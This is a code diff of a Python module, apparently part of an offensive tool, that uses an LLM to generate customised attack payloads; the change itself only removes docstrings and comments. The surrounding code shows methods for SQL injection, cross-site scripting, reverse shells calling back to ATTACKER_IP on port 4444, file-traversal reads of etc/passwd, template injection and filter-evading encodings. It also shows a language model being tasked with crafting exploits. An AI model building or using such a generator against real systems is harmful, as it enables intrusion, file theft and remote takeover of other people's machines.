@@ -1,7 +1,3 @@
-"""
-LLM-Based Payload Generator
-Customizes exploit payloads for target environment
-"""
 
 import asyncio
 import logging
@@ -19,7 +15,6 @@ _PAYLOAD_LLM_TIMEOUT_S = 45.0
 
 
 async def _bounded_generate(client, prompt: str, **kwargs) -> Any:
-    """Wrap `client.generate` in `asyncio.wait_for`. Returns None on timeout."""
     try:
         return await asyncio.wait_for(
             client.generate(prompt, **kwargs),
@@ -71,7 +66,6 @@ TEMPLATES = {
 
 
 class PayloadGenerator:
-    """LLM-powered payload customization"""
 
     def __init__(self):
         self.client = LLMClient.get()
@@ -82,7 +76,6 @@ class PayloadGenerator:
         database_type: str,
         detected_filters: List[str] = None
     ) -> str:
-        """Generate SQLi payload for target database"""
 
         template = TEMPLATES[PayloadType.SQLI]["basic"]
         
@@ -113,11 +106,10 @@ Common bypasses:
 
     async def generate_xss(
         self,
-        context: str,  # "html", "js", "attribute", "url"
+        context: str,
         detected_filters: List[str] = None,
         target_browser: str = "chrome"
     ) -> str:
-        """Generate XSS payload for context"""
 
         template = TEMPLATES[PayloadType.XSS]["basic"]
 
@@ -142,12 +134,11 @@ Be creative with encoding and obfuscation."""
 
     async def generate_rce(
         self,
-        shell_type: str = "bash",  # bash, powershell, php, nodejs
+        shell_type: str = "bash",
         attacker_ip: str = "ATTACKER_IP",
         port: int = 4444,
-        encoding: str = "none"  # none, base64, hex, url
+        encoding: str = "none"
     ) -> str:
-        """Generate reverse shell payload"""
 
         template = TEMPLATES[PayloadType.RCE].get(
             shell_type.lower(), TEMPLATES[PayloadType.RCE]["bash"]
@@ -173,11 +164,10 @@ Ensure it connects back to {attacker_ip}:{port}"""
 
     async def generate_lfi(
         self,
-        target_os: str = "linux",  # linux, windows
+        target_os: str = "linux",
         file_path: str = "etc/passwd",
         encoding: str = "none"
     ) -> str:
-        """Generate LFI traversal payload"""
 
         template = TEMPLATES[PayloadType.LFI].get(
             target_os.lower(), TEMPLATES[PayloadType.LFI]["linux"]
@@ -202,10 +192,9 @@ Return ONLY the payload with correct path traversal for {target_os}."""
 
     async def generate_ssti(
         self,
-        template_engine: str,  # jinja, erb, mako, etc
+        template_engine: str,
         detected_filters: List[str] = None
     ) -> str:
-        """Generate SSTI bypass payload"""
 
         template = TEMPLATES[PayloadType.SSTI].get(
             template_engine.lower(), TEMPLATES[PayloadType.SSTI]["jinja"]
@@ -227,7 +216,6 @@ Return payload that bypasses filters and executes 7*7."""
         return payload.strip() if payload else template
 
     async def generate_encoding(self, payload: str, encoding: str) -> str:
-        """Encode payload for WAF/filter bypass"""
 
         if not await self.client.is_available():
             return payload
